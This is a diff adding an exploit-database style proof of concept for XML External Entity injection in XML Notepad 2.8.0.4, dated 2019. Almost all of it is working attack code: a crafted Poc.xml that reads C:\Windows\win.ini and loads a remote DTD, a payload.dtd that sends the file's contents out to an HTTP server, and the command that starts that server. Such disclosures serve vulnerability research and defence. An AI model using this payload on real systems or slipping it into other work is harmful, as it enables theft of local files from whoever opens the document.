@@ -1,0 +1,29 @@
+# Exploit Title: XML Notepad 2.8.0.4 - XML External Entity Injection
+# Date: 2019-11-11
+# Exploit Author: 8-Team / daejinoh
+# Vendor Homepage:  https://www.microsoft.com/  
+# Software Link:  https://github.com/microsoft/XmlNotepad  
+# Version: XML Notepad 2.8.0.4
+# Tested on: Windows 10 Pro
+# CVE : N/A
+
+# Step
+1) File -> Open -> *.xml
+
+# Exploit Code
+
+1) Server(python 3.7) : python -m http.server
+2) Poc.xml : 
+<?xml version="1.0"?>
+<!DOCTYPE test [
+<!ENTITY % file SYSTEM "C:\Windows\win.ini">
+<!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+3) payload.dtd
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:8000?%file;'>">
+%all;
+
+  --------------------------------------------------------------------------------
